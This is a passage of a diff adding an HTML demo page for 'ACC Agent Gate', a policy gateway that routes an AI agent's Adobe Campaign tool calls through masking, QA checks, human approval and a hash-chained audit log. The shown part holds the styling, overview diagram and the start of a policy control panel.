@@ -1,0 +1,1100 @@
+<title>ACC Agent Gate</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;500;600;700;800;900&family=Source+Code+Pro:wght@400;500;600&display=swap">
+<style>
+/* Layout: Experience Cloud–style app shell. Top app bar, sticky side nav, cards on a light gray canvas.
+   Spectrum-inspired neutrals, blue accent, semantic status lights. */
+:root{
+  --canvas:#f5f5f5; --card:#ffffff; --raised:#fafafa; --border:#e1e1e1; --border-strong:#cacaca;
+  --text:#222222; --text-2:#464646; --muted:#6e6e6e; --hover:#ececec;
+  --accent:#1473e6; --accent-down:#0d66d0; --accent-soft:#e5f0fd; --on-accent:#ffffff;
+  --positive:#12805c; --positive-soft:#e3f4ec;
+  --info:#0d66d0; --info-soft:#e5f0fd;
+  --notice:#cb6f10; --notice-soft:#fcefdc;
+  --negative:#d7373f; --negative-soft:#fbe5e6;
+  --purple:#7e4cc9; --purple-soft:#efe7fa;
+  --bar:#ffffff; --code:#f3f6fa;
+  --font:"Source Sans 3","Adobe Clean",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --mono:"Source Code Pro",ui-monospace,Menlo,Consolas,monospace;
+  --r:8px;
+}
+@media (prefers-color-scheme: dark){:root:not([data-theme="light"]){
+  --canvas:#1b1b1b; --card:#252525; --raised:#2c2c2c; --border:#3a3a3a; --border-strong:#4a4a4a;
+  --text:#ebebeb; --text-2:#cfcfcf; --muted:#a2a2a2; --hover:#333333;
+  --accent:#4b9cf5; --accent-down:#5aa9fa; --accent-soft:#16304f; --on-accent:#0e1a2b;
+  --positive:#33ab84; --positive-soft:#123a2d; --info:#5aa9fa; --info-soft:#16304f;
+  --notice:#f29423; --notice-soft:#3d2a10; --negative:#f75c5c; --negative-soft:#45191b;
+  --purple:#b18cf2; --purple-soft:#2f2445; --bar:#1f1f1f; --code:#1f2329; color-scheme:dark}}
+:root[data-theme="dark"]{
+  --canvas:#1b1b1b; --card:#252525; --raised:#2c2c2c; --border:#3a3a3a; --border-strong:#4a4a4a;
+  --text:#ebebeb; --text-2:#cfcfcf; --muted:#a2a2a2; --hover:#333333;
+  --accent:#4b9cf5; --accent-down:#5aa9fa; --accent-soft:#16304f; --on-accent:#0e1a2b;
+  --positive:#33ab84; --positive-soft:#123a2d; --info:#5aa9fa; --info-soft:#16304f;
+  --notice:#f29423; --notice-soft:#3d2a10; --negative:#f75c5c; --negative-soft:#45191b;
+  --purple:#b18cf2; --purple-soft:#2f2445; --bar:#1f1f1f; --code:#1f2329; color-scheme:dark}
+
+*{box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--canvas);color:var(--text);font:15px/1.5 var(--font);-webkit-font-smoothing:antialiased}
+body::before{content:"";position:fixed;inset:0 0 auto;height:env(safe-area-inset-top,0px);z-index:30;background:var(--bar)}
+h1,h2,h3{margin:0;text-wrap:balance;font-weight:800}
+a{color:var(--accent)}
+code,.mono{font-family:var(--mono);font-size:.9em}
+.tnum{font-variant-numeric:tabular-nums}
+button,select,input,textarea{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+
+/* ---------- app bar */
+.appbar{position:sticky;top:env(safe-area-inset-top,0px);z-index:20;background:var(--bar);border-bottom:1px solid var(--border);
+  padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));padding-block:0}
+.appbar .in{height:52px;display:flex;align-items:center;gap:14px;min-width:0}
+.mark{width:30px;height:30px;border-radius:7px;background:var(--accent);display:grid;place-items:center;flex:none}
+.mark svg{width:18px;height:18px}
+.appname{font-weight:800;font-size:16px;white-space:nowrap}
+.crumbs{color:var(--muted);font-size:13.5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;min-width:0}
+.crumbs b{color:var(--text-2);font-weight:600}
+.bar-right{margin-left:auto;display:flex;gap:10px;align-items:center;flex:none}
+.badge{font:600 12px var(--font);padding:3px 10px;border-radius:4px;background:var(--hover);color:var(--text-2);white-space:nowrap}
+
+/* ---------- shell */
+.shell{display:grid;grid-template-columns:220px minmax(0,1fr);gap:0;max-width:1440px;margin:0 auto}
+.sidenav{position:sticky;top:calc(52px + env(safe-area-inset-top,0px));align-self:start;height:calc(100vh - 52px);overflow:auto;
+  padding:20px 12px 20px max(12px,env(safe-area-inset-left,0px));border-right:1px solid var(--border);background:var(--card)}
+.sidenav .grp{font:700 11px var(--font);letter-spacing:.08em;text-transform:uppercase;color:var(--muted);padding:14px 12px 6px}
+.sidenav a{display:flex;align-items:center;gap:10px;padding:8px 12px;border-radius:6px;color:var(--text-2);text-decoration:none;font-weight:500;font-size:14.5px}
+.sidenav a:hover{background:var(--hover)}
+.sidenav a.on{background:var(--accent-soft);color:var(--accent);font-weight:700}
+.sidenav a .cnt{margin-left:auto;font:600 11.5px var(--mono);color:var(--muted)}
+main{padding:28px max(16px,env(safe-area-inset-right,0px)) 64px 28px;min-width:0;display:flex;flex-direction:column;gap:40px}
+section{scroll-margin-top:72px;display:flex;flex-direction:column;gap:16px;min-width:0}
+.sec-head{display:flex;flex-wrap:wrap;align-items:flex-end;gap:8px 16px}
+.sec-head h2{font-size:clamp(22px,2.6vw,28px);line-height:1.15}
+.sec-head .sub{color:var(--muted);max-width:70ch;flex-basis:100%;margin:0}
+.kicker{font:700 12px var(--font);letter-spacing:.08em;text-transform:uppercase;color:var(--accent);flex-basis:100%}
+.card{background:var(--card);border:1px solid var(--border);border-radius:var(--r);padding:20px;min-width:0}
+.card h3{font-size:16px;font-weight:700}
+.card .hint{color:var(--muted);font-size:13.5px;margin:4px 0 0}
+
+/* ---------- status lights + buttons */
+.sl{display:inline-flex;align-items:center;gap:7px;font-size:13px;font-weight:600;white-space:nowrap;color:var(--text-2)}
+.sl::before{content:"";width:9px;height:9px;border-radius:50%;background:var(--c,var(--muted));flex:none}
+.s-allow{--c:var(--positive)} .s-allow_masked{--c:var(--info)} .s-dry_run{--c:var(--purple)}
+.s-needs_approval{--c:var(--notice)} .s-block{--c:var(--negative)}
+.s-approved,.s-partial_approval{--c:var(--positive)} .s-rejected{--c:var(--negative)}
+.tag{display:inline-flex;align-items:center;font:600 12px var(--font);padding:2px 8px;border-radius:4px;white-space:nowrap}
+.t-pos{background:var(--positive-soft);color:var(--positive)} .t-neg{background:var(--negative-soft);color:var(--negative)}
+.t-not{background:var(--notice-soft);color:var(--notice)} .t-info{background:var(--info-soft);color:var(--info)}
+.t-pur{background:var(--purple-soft);color:var(--purple)} .t-neu{background:var(--hover);color:var(--text-2)}
+.btn{border-radius:999px;padding:7px 18px;font-weight:700;font-size:14px;cursor:pointer;border:2px solid transparent;line-height:1.3;white-space:nowrap}
+.btn-accent{background:var(--accent);color:var(--on-accent)} .btn-accent:hover{background:var(--accent-down)}
+.btn-sec{background:transparent;border-color:var(--border-strong);color:var(--text)} .btn-sec:hover{background:var(--hover)}
+.btn-neg{background:transparent;border-color:var(--negative);color:var(--negative)} .btn-neg:hover{background:var(--negative-soft)}
+.btn-sm{padding:4px 12px;font-size:13px}
+.btn:disabled{opacity:.45;cursor:not-allowed}
+
+/* ---------- overview */
+.hero{display:grid;grid-template-columns:minmax(0,1.25fr) minmax(0,1fr);gap:16px}
+.hero .lead h1{font-size:clamp(28px,3.6vw,40px);line-height:1.1;font-weight:900;letter-spacing:-.01em}
+.hero .lead p{font-size:17px;color:var(--text-2);margin:12px 0 0;max-width:56ch}
+.hero .lead .cta{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px}
+.kpis{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:12px}
+.kpi{background:var(--card);border:1px solid var(--border);border-radius:var(--r);padding:14px 16px;min-width:0}
+.kpi .l{font-size:13px;color:var(--muted);font-weight:600}
+.kpi .n{font-size:34px;font-weight:800;line-height:1.1;margin-top:4px;font-variant-numeric:tabular-nums}
+.kpi .sl{margin-top:6px}
+.meter .track{height:10px;border-radius:5px;background:var(--hover);overflow:hidden;display:flex}
+.meter .track span{transition:width .4s ease}
+.meter .lbl{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-size:13px;color:var(--muted);margin-bottom:6px}
+.meter .lbl b{color:var(--text);font-weight:700}
+.flow{overflow-x:auto}
+.flow svg{display:block;width:100%;min-width:640px;height:auto}
+
+/* ---------- policy lab */
+.lab{display:grid;grid-template-columns:340px minmax(0,1fr);gap:16px;align-items:start}
+.presets{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-top:12px}
+.preset{border:1px solid var(--border-strong);background:var(--card);border-radius:var(--r);padding:9px 10px;text-align:left;cursor:pointer}
+.preset b{display:block;font-size:13.5px}
+.preset span{font-size:12px;color:var(--muted)}
+.preset[aria-pressed="true"]{border-color:var(--accent);background:var(--accent-soft)}
+.preset[aria-pressed="true"] b{color:var(--accent)}
+.ctl-grp{border-top:1px solid var(--border);margin-top:16px;padding-top:12px}
+.ctl-grp .gt{font:700 11.5px var(--font);letter-spacing:.08em;text-transform:uppercase;color:var(--muted);margin-bottom:4px}
+.ctl{display:flex;align-items:center;justify-content:space-between;gap:12px;padding:7px 0}
+.ctl label,.ctl .cl{font-size:14px;color:var(--text-2);min-width:0}
+.ctl small{display:block;color:var(--muted);font-size:12px}
+.switch{position:relative;width:34px;height:18px;flex:none}
+.switch input{position:absolute;inset:0;opacity:0;margin:0;cursor:pointer;z-index:1}
+.switch i{position:absolute;inset:0;border-radius:9px;border:2px solid var(--border-strong);background:var(--card);transition:.15s}
+.switch i::after{content:"";position:absolute;top:2px;left:2px;width:10px;height:10px;border-radius:50%;background:var(--muted);transition:.15s}
+.switch input:checked + i{background:var(--accent);border-color:var(--accent)}
+.switch input:checked + i::after{left:18px;background:var(--on-accent)}
+.switch input:focus-visible + i{outline:2px solid var(--accent);outline-offset:2px}
+.seg{display:inline-flex;border:1px solid var(--border-strong);border-radius:999px;overflow:hidden;flex:none}
+.seg button{border:0;background:transparent;padding:4px 10px;font-size:12.5px;font-weight:600;cursor:pointer;color:var(--text-2)}
+.seg button[aria-pressed="true"]{background:var(--accent);color:var(--on-accent)}
+.range{display:flex;align-items:center;gap:10px;flex:none}
+.range input{width:110px;accent-color:var(--accent)}
+.range output{font:600 12.5px var(--mono);min-width:54px;text-align:right}
+select.sel{border:1px solid var(--border-strong);background:var(--card);border-radius:6px;padding:4px 8px;font-size:13.5px}
+.verdict{border-radius:var(--r);padding:16px 18px;display:flex;gap:14px;align-items:flex-start}
+.verdict.ok{background:var(--positive-soft)} .verdict.bad{background:var(--negative-soft)}
+.verdict .ic{width:26px;height:26px;border-radius:50%;display:grid;place-items:center;font-weight:900;color:var(--card);flex:none;font-size:15px}
+.verdict.ok .ic{background:var(--positive)} .verdict.bad .ic{background:var(--negative)}
+.verdict h3{font-size:17px}
+.verdict ul{margin:6px 0 0;padding-left:18px;font-size:14px;color:var(--text-2)}
+.outgrid{display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px;margin-top:14px}
+.og{border:1px solid var(--border);border-radius:var(--r);padding:12px;min-width:0;background:var(--raised)}
+.og .n{font-size:28px;font-weight:800;line-height:1.1;font-variant-numeric:tabular-nums}
+.og .d{font:600 12px var(--mono);margin-left:4px}
+.d-up{color:var(--negative)} .d-down{color:var(--positive)}
+.diffnote{font-size:13.5px;color:var(--muted);margin-top:12px}
+
+/* ---------- replay list */
+.toolbar{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.qf{border:1px solid var(--border-strong);background:var(--card);border-radius:999px;padding:5px 12px;font-size:13px;font-weight:600;cursor:pointer;color:var(--text-2)}
+.qf[aria-pressed="true"]{background:var(--text);color:var(--card);border-color:var(--text)}
+.toolbar .btn{margin-left:auto}
+.log{border:1px solid var(--border);border-radius:var(--r);background:var(--card);overflow:hidden}
+.ph{background:var(--raised);padding:9px 16px;font:700 12px var(--font);letter-spacing:.06em;text-transform:uppercase;color:var(--muted);display:flex;justify-content:space-between;border-bottom:1px solid var(--border)}
+.ph span{text-transform:none;letter-spacing:0;font-weight:600}
+.row{display:grid;grid-template-columns:40px minmax(0,1fr) 170px;gap:12px;padding:12px 16px;border-bottom:1px solid var(--border);align-items:start;transition:background .2s}
+.row:last-child{border-bottom:0}
+.row .seq{font:600 12px var(--mono);color:var(--muted);padding-top:3px}
+.row .who{font-size:12px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.05em}
+.row .intent{font-weight:600;margin:1px 0 4px;overflow-wrap:anywhere}
+.row .tool{font:500 12.5px var(--mono);color:var(--accent);overflow-wrap:anywhere}
+.row .reason{font-size:13.5px;color:var(--text-2);margin-top:3px;overflow-wrap:anywhere}
+.row .out{font-size:13.5px;color:var(--muted);margin-top:2px;overflow-wrap:anywhere}
+.row .right{display:flex;flex-direction:column;align-items:flex-end;gap:6px}
+.riskbar{width:90px;height:4px;border-radius:2px;background:var(--hover);overflow:hidden}
+.riskbar i{display:block;height:100%}
+.row.human{background:var(--raised)}
+.row.changed{box-shadow:inset 3px 0 0 var(--notice)}
+.row.live{background:var(--accent-soft)}
+.row.dim{opacity:.35}
+
+/* ---------- playground */
+.pg{display:grid;grid-template-columns:minmax(0,1.2fr) minmax(0,1fr);gap:16px;align-items:start}
+.tabs{display:flex;gap:4px;border-bottom:2px solid var(--border);overflow-x:auto}
+.tabs button{border:0;background:transparent;padding:9px 12px;font-weight:700;font-size:14px;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;margin-bottom:-2px;white-space:nowrap}
+.tabs button[aria-selected="true"]{color:var(--text);border-bottom-color:var(--accent)}
+.pane{padding-top:14px;display:flex;flex-direction:column;gap:12px}
+.chips{display:flex;flex-wrap:wrap;gap:6px}
+.chip{border:1px solid var(--border);background:var(--raised);border-radius:6px;padding:4px 10px;font-size:12.5px;cursor:pointer;color:var(--text-2)}
+.chip:hover{border-color:var(--accent);color:var(--accent)}
+textarea.ed{width:100%;min-height:110px;resize:vertical;border:1px solid var(--border-strong);border-radius:6px;background:var(--code);padding:10px 12px;font:13px/1.55 var(--mono)}
+.field{display:flex;flex-direction:column;gap:4px;font-size:13px;font-weight:600;color:var(--muted)}
+.field select{border:1px solid var(--border-strong);background:var(--card);border-radius:6px;padding:7px 10px;font-size:14px;color:var(--text);font-weight:500}
+.fields{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.result{border:1px solid var(--border);border-radius:var(--r);padding:16px;background:var(--raised)}
+.result .top{display:flex;justify-content:space-between;align-items:center;gap:10px;flex-wrap:wrap}
+.result .dec{font-size:20px;font-weight:800}
+.result dl{display:grid;grid-template-columns:90px minmax(0,1fr);gap:6px 12px;margin:12px 0 0;font-size:14px}
+.result dt{color:var(--muted);font-weight:600}
+.result dd{margin:0;overflow-wrap:anywhere}
+.result .find{margin:8px 0 0;padding-left:18px;font-size:13.5px;color:var(--text-2)}
+.empty{color:var(--muted);font-size:14px;padding:6px 0}
+.inbox{display:flex;flex-direction:column;gap:10px}
+.ticket{border:1px solid var(--border);border-left:4px solid var(--notice);border-radius:var(--r);padding:12px 14px;background:var(--card)}
+.ticket .tt{display:flex;justify-content:space-between;gap:8px;flex-wrap:wrap;font-weight:700}
+.ticket p{margin:4px 0 8px;font-size:13.5px;color:var(--text-2)}
+.ticket .acts{display:flex;flex-wrap:wrap;gap:6px}
+.ticket .err{color:var(--negative);font-size:13px;margin-top:6px}
+.livechain{font:12px/1.4 var(--mono);display:flex;flex-direction:column;max-height:260px;overflow:auto}
+.lc{display:grid;grid-template-columns:28px minmax(0,1fr);gap:8px;padding:7px 0;border-bottom:1px dashed var(--border)}
+.lc:last-child{border-bottom:0}
+.lc .h{color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.lc b{color:var(--text);font-weight:600}
+
+/* ---------- QA board */
+.tablewrap{overflow-x:auto;border:1px solid var(--border);border-radius:var(--r);background:var(--card)}
+table.qa{border-collapse:collapse;width:100%;min-width:820px;font-size:13.5px}
+.qa th,.qa td{padding:9px 8px;border-bottom:1px solid var(--border);text-align:center}
+.qa thead th{background:var(--raised);font-size:12px;font-weight:700;color:var(--muted);vertical-align:bottom;line-height:1.25}
+.qa th[scope=row]{text-align:left;padding-left:16px;font-weight:600;white-space:nowrap}
+.qa th[scope=row] small{display:block;font:500 11.5px var(--mono);color:var(--muted)}
+.qa tbody tr:last-child>*{border-bottom:0}
+.cell{width:30px;height:30px;border-radius:6px;border:0;cursor:pointer;font:700 13px var(--font);display:inline-grid;place-items:center}
+.c-pass{background:var(--positive-soft);color:var(--positive)}
+.c-blocker{background:var(--negative);color:var(--card)}
+.c-warning{background:var(--notice-soft);color:var(--notice);box-shadow:inset 0 0 0 1.5px var(--notice)}
+.c-fixed{background:var(--positive-soft);color:var(--positive);box-shadow:inset 0 0 0 1.5px var(--positive)}
+.cell[aria-pressed="true"]{outline:2px solid var(--accent);outline-offset:2px}
+.qadetail{display:flex;gap:16px;align-items:flex-start;flex-wrap:wrap}
+.qadetail .txt{flex:1 1 320px;min-width:0}
+.qadetail h3{font-size:16px}
+.qadetail p{margin:4px 0 0;color:var(--text-2);font-size:14px}
+
+/* ---------- audit */
+.audit{display:grid;grid-template-columns:minmax(0,1.3fr) minmax(0,1fr);gap:16px;align-items:start}
+.chain{display:flex;flex-direction:column}
+.link{display:grid;grid-template-columns:34px minmax(0,1fr) auto;gap:10px;align-items:center;padding:9px 10px;border-radius:6px;border:0;background:transparent;text-align:left;cursor:pointer;font:12px/1.4 var(--mono)}
+.link:hover{background:var(--hover)}
+.link .h{color:var(--muted);overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.link .h b{color:var(--text);font-weight:600}
+.link.forged .h b{color:var(--negative)}
+.link.after .h{color:var(--negative)}
+.vstate{font-size:24px;font-weight:800;margin-top:4px}
+.vstate.ok{color:var(--positive)} .vstate.bad{color:var(--negative)}
+
+/* ---------- policy + sources */
+.pol{display:grid;grid-template-columns:minmax(0,1fr) minmax(0,1fr);gap:16px;align-items:start}
+pre.yaml{margin:0;background:var(--code);border:1px solid var(--border);border-radius:var(--r);padding:16px;font:12.5px/1.6 var(--mono);overflow-x:auto;max-height:560px}
+.yaml .k{color:var(--accent)} .yaml .v{color:var(--positive)} .yaml .c{color:var(--muted)} .yaml .chg{background:var(--notice-soft);border-radius:3px}
+.principles{list-style:none;margin:0;padding:0;display:flex;flex-direction:column;gap:14px}
+.principles li{display:grid;grid-template-columns:26px minmax(0,1fr);gap:10px}
+.principles .i{font:700 13px var(--mono);color:var(--accent);padding-top:1px}
+.principles b{display:block}
+.principles span{color:var(--muted);font-size:14px}
+.ref{font:600 11px var(--mono);text-decoration:none;vertical-align:super;margin-left:1px}
+.sources{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(auto-fit,minmax(300px,1fr));gap:12px}
+.sources li{background:var(--card);border:1px solid var(--border);border-radius:var(--r);padding:14px 16px;display:grid;grid-template-columns:30px minmax(0,1fr);gap:8px;min-width:0}
+.sources li:target{outline:2px solid var(--accent)}
+.sources .n{font:600 12px var(--mono);color:var(--accent);padding-top:2px}
+.sources a{color:var(--text);font-weight:700;text-decoration:none;overflow-wrap:anywhere}
+.sources a:hover{color:var(--accent);text-decoration:underline}
+.sources p{margin:4px 0 0;font-size:13.5px;color:var(--muted)}
+.sources .d{font:500 11.5px var(--mono);color:var(--muted);margin-top:6px;display:block}
+footer{border-top:1px solid var(--border);padding-top:20px;color:var(--muted);font-size:13px;display:flex;flex-wrap:wrap;gap:8px 24px;justify-content:space-between}
+footer b{color:var(--text)}
+
+@media (max-width:1100px){
+  .lab,.pg,.audit,.pol,.hero{grid-template-columns:minmax(0,1fr)}
+}
+@media (max-width:860px){
+  .shell{grid-template-columns:minmax(0,1fr)}
+  .sidenav{position:sticky;top:calc(52px + env(safe-area-inset-top,0px));z-index:15;height:auto;display:flex;overflow-x:auto;gap:4px;
+    padding:8px max(16px,env(safe-area-inset-right,0px)) 8px max(16px,env(safe-area-inset-left,0px));border-right:0;border-bottom:1px solid var(--border)}
+  .sidenav .grp{display:none}
+  .sidenav a{white-space:nowrap;padding:6px 12px;font-size:13.5px}
+  .sidenav a .cnt{display:none}
+  main{padding:20px max(16px,env(safe-area-inset-right,0px)) 48px max(16px,env(safe-area-inset-left,0px))}
+  section{scroll-margin-top:110px}
+  .crumbs{display:none}
+}
+@media (max-width:560px){
+  .outgrid{grid-template-columns:repeat(2,minmax(0,1fr))}
+  .row{grid-template-columns:30px minmax(0,1fr)}
+  .row .right{grid-column:2;flex-direction:row;align-items:center}
+  .fields{grid-template-columns:1fr}
+  .bar-right .badge{display:none}
+  .toolbar .btn{margin-left:0}
+  .presets{grid-template-columns:1fr}
+}
+@media (prefers-reduced-motion:reduce){*{transition:none!important;scroll-behavior:auto!important}}
+</style>
+
+<header class="appbar"><div class="in">
+  <span class="mark" aria-hidden="true"><svg viewBox="0 0 24 24"><path d="M12 2 4 5v6c0 5 3.4 9.4 8 11 4.6-1.6 8-6 8-11V5l-8-3Z" style="fill:var(--on-accent)"/><path d="m8.5 12 2.5 2.5 4.5-5" style="fill:none;stroke:var(--accent);stroke-width:2.2;stroke-linecap:round;stroke-linejoin:round"/></svg></span>
+  <span class="appname">ACC Agent Gate</span>
+  <span class="crumbs">Campaign v8 · <b>aurora-mkt-prod</b> · Black Friday 2026</span>
+  <span class="bar-right"><span class="badge">Synthetic demo data</span><span class="sl s-allow">Gate active</span></span>
+</div></header>
+
+<div class="shell">
+<nav class="sidenav" aria-label="Sections">
+  <div class="grp">Gate</div>
+  <a href="#overview" class="on">Overview</a>
+  <a href="#lab">Policy lab</a>
+  <a href="#playground">Playground</a>
+  <a href="#approvals">Approvals <span class="cnt" id="nav-inbox">0</span></a>
+  <div class="grp">Evidence</div>
+  <a href="#qa">QA board</a>
+  <a href="#audit">Audit log</a>
+  <a href="#policy">Policy file</a>
+  <a href="#sources">Sources</a>
+</nav>
+
+<main>
+<!-- ============ OVERVIEW -->
+<section id="overview">
+  <div class="hero">
+    <div class="card lead">
+      <span class="kicker">AI agent governance for Adobe Campaign</span>
+      <h1 style="margin-top:8px">The agent asks. The policy decides. A human signs.</h1>
+      <p>An AI agent got a Black Friday brief for 8 EU markets and made <b id="h-calls">28</b> calls to Campaign. The gate ran <b id="h-ran">13</b>, explained <b id="h-dry">1</b> without running it, sent <b id="h-hold">5</b> to a human, and blocked <b id="h-block">9</b> before they reached production.</p>
+      <div class="cta"><a class="btn btn-accent" href="#lab" style="text-decoration:none">Change the policy</a><a class="btn btn-sec" href="#playground" style="text-decoration:none">Try your own call</a></div>
+    </div>
+    <div style="display:flex;flex-direction:column;gap:12px;min-width:0">
+      <div class="kpis" id="kpis"></div>
+      <div class="card meter" style="padding:14px 16px">
+        <div class="lbl"><span>Recipients sent <b id="m-sent">0</b></span><span>Held by QA <b id="m-held">0</b></span></div>
+        <div class="track" id="m-track"></div>
+      </div>
+    </div>
+  </div>
+  <div class="card flow">
+    <h3>How a tool call travels</h3>
+    <p class="hint">Adobe’s CX Enterprise agentic tools list Campaign Classic capabilities that include query execution, workflow control and SOAP/JS execution <a class="ref" href="#src-1">[1]</a>. The gate is an MCP server the agent talks to instead. Approvals are not a tool the agent can call.</p>
+    <svg viewBox="0 0 960 300" role="img" aria-label="Diagram: the AI agent sends a tool call to the gate; the gate applies policy, analyzers and QA, then allows, masks, dry-runs, queues for a human or blocks; only allowed calls reach Adobe Campaign; every decision goes to the audit chain." style="margin-top:14px">
+      <defs><marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" style="fill:var(--muted)"/></marker></defs>
+      <rect x="10" y="100" width="170" height="92" rx="8" style="fill:var(--raised);stroke:var(--border-strong)"/>
+      <text x="95" y="134" text-anchor="middle" style="fill:var(--text);font-weight:700;font-size:16px">AI agent</text>
+      <text x="95" y="156" text-anchor="middle" style="fill:var(--muted);font-size:13px">Claude · Cursor · any</text>
+      <text x="95" y="174" text-anchor="middle" style="fill:var(--muted);font-size:13px">MCP client</text>
+      <line x1="182" y1="146" x2="300" y2="146" style="stroke:var(--muted);stroke-width:1.5" marker-end="url(#ar)"/>
+      <text x="241" y="136" text-anchor="middle" style="fill:var(--muted);font-size:12px;font-family:var(--mono)">tool call</text>
+      <rect x="302" y="40" width="300" height="212" rx="10" style="fill:var(--card);stroke:var(--accent);stroke-width:2"/>
+      <text x="452" y="70" text-anchor="middle" style="fill:var(--accent);font-weight:800;font-size:17px">ACC Agent Gate</text>
+      <rect x="322" y="86" width="260" height="30" rx="5" style="fill:var(--accent-soft)"/>
+      <text x="452" y="106" text-anchor="middle" style="fill:var(--text);font-size:13px">policy/default.yaml · fail closed</text>
+      <rect x="322" y="122" width="126" height="30" rx="5" style="fill:var(--raised);stroke:var(--border)"/>
+      <text x="385" y="142" text-anchor="middle" style="fill:var(--text);font-size:13px">SQL / JS analyzers</text>
+      <rect x="456" y="122" width="126" height="30" rx="5" style="fill:var(--raised);stroke:var(--border)"/>
+      <text x="519" y="142" text-anchor="middle" style="fill:var(--text);font-size:13px">9-check pre-send QA</text>
+      <rect x="322" y="158" width="260" height="30" rx="5" style="fill:var(--raised);stroke:var(--border)"/>
+      <text x="452" y="178" text-anchor="middle" style="fill:var(--text);font-size:13px">PII masking · row caps · write limits</text>
+      <g style="font-size:11.5px;font-weight:700">
+        <rect x="322" y="200" width="46" height="34" rx="5" style="fill:var(--positive-soft)"/><text x="345" y="221" text-anchor="middle" style="fill:var(--positive)">allow</text>
+        <rect x="373" y="200" width="46" height="34" rx="5" style="fill:var(--info-soft)"/><text x="396" y="221" text-anchor="middle" style="fill:var(--info)">mask</text>
+        <rect x="424" y="200" width="46" height="34" rx="5" style="fill:var(--purple-soft)"/><text x="447" y="221" text-anchor="middle" style="fill:var(--purple)">dry</text>
+        <rect x="475" y="200" width="52" height="34" rx="5" style="fill:var(--notice-soft)"/><text x="501" y="221" text-anchor="middle" style="fill:var(--notice)">human</text>
+        <rect x="532" y="200" width="50" height="34" rx="5" style="fill:var(--negative-soft)"/><text x="557" y="221" text-anchor="middle" style="fill:var(--negative)">block</text>
+      </g>
+      <line x1="604" y1="146" x2="760" y2="146" style="stroke:var(--muted);stroke-width:1.5" marker-end="url(#ar)"/>
+      <text x="690" y="166" text-anchor="middle" style="fill:var(--muted);font-size:12px;font-family:var(--mono)">only if allowed</text>
+      <rect x="762" y="100" width="188" height="92" rx="8" style="fill:var(--raised);stroke:var(--border-strong)"/>
+      <text x="856" y="134" text-anchor="middle" style="fill:var(--text);font-weight:700;font-size:16px">Adobe Campaign</text>
+      <text x="856" y="156" text-anchor="middle" style="fill:var(--muted);font-size:13px">Classic v8 instance</text>
+      <text x="856" y="174" text-anchor="middle" style="fill:var(--muted);font-size:13px">(mock in this demo)</text>
+      <rect x="652" y="12" width="150" height="50" rx="8" style="fill:var(--notice-soft);stroke:var(--notice)"/>
+      <text x="727" y="34" text-anchor="middle" style="fill:var(--text);font-weight:700;font-size:14px">Human approver</text>
+      <text x="727" y="52" text-anchor="middle" style="fill:var(--muted);font-size:12px">role-checked, 1 or 2</text>
+      <path d="M604 214 C 640 214, 640 62, 652 50" style="fill:none;stroke:var(--notice);stroke-width:1.5;stroke-dasharray:4 4" marker-end="url(#ar)"/>
+      <path d="M727 64 C 727 100, 700 120, 705 140" style="fill:none;stroke:var(--notice);stroke-width:1.5;stroke-dasharray:4 4" marker-end="url(#ar)"/>
+      <rect x="302" y="266" width="300" height="28" rx="5" style="fill:var(--card);stroke:var(--border-strong)"/>
+      <text x="452" y="285" text-anchor="middle" style="fill:var(--text);font-size:12.5px;font-family:var(--mono)">audit.jsonl · sha-256 chain</text>
+      <line x1="452" y1="252" x2="452" y2="264" style="stroke:var(--muted);stroke-width:1.5" marker-end="url(#ar)"/>
+    </svg>
+  </div>
+</section>
+
+<!-- ============ POLICY LAB -->
+<section id="lab">
+  <div class="sec-head">
+    <span class="kicker">Policy lab</span>
+    <h2>Loosen a rule and watch the same session play out</h2>
+    <p class="sub">Every change re-runs all 28 agent calls through the gate in your browser. Simulated approvers sign whatever reaches them, except the production reminder they reject for a business reason. That is the point: humans alone miss what policy catches.</p>
+  </div>
+  <div class="lab">
+    <div class="card" id="controls">
+      <h3>Policy</h3>
+      <div class="presets" role="group" aria-label="Policy presets">
+        <button class="preset" data-preset="recommended" aria-pressed="true"><b>Recommended</b><span>Default policy file</span></button>
+        <button class="preset" data-preset="humans" aria-pressed="false"><b>Humans only</b><span>Approvals, no QA gate</span></button>
+        <button class="preset" data-preset="autopilot" aria-pressed="false"><b>Agent autopilot</b><span>No gate at all</span></button>
+        <button class="preset" data-preset="lockdown" aria-pressed="false"><b>Lockdown</b><span>Kill switch on</span></button>
+      </div>
+      <div class="ctl-grp"><div class="gt">Data &amp; queries</div>
+        <div class="ctl"><label for="p-mask">Mask PII in results<small>Emails, phones, names, birth dates</small></label><span class="switch"><input type="checkbox" id="p-mask" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-sql">Block SQL writes<small>INSERT, UPDATE, DELETE, DROP…</small></label><span class="switch"><input type="checkbox" id="p-sql" role="switch"><i></i></span></div>
+        <div class="ctl"><label for="p-rows">Row cap per query</label><select class="sel" id="p-rows"><option value="500">500</option><option value="5000">5,000</option><option value="100000">100,000</option></select></div>
+      </div>
+      <div class="ctl-grp"><div class="gt">Sends</div>
